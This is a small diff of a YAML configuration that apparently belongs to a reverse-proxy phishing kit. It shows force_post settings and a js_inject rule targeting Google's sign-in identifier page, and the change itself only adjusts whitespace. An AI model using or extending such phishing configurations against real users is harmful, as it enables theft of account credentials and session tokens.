@@ -50,7 +50,8 @@ force_post:
     force:
       - {key: 'continue', value: ''}
     type: 'post'
-	
+
+ 
 js_inject:
   - trigger_domains: ['accounts.google.com']
     trigger_paths: ['signin/identifier']
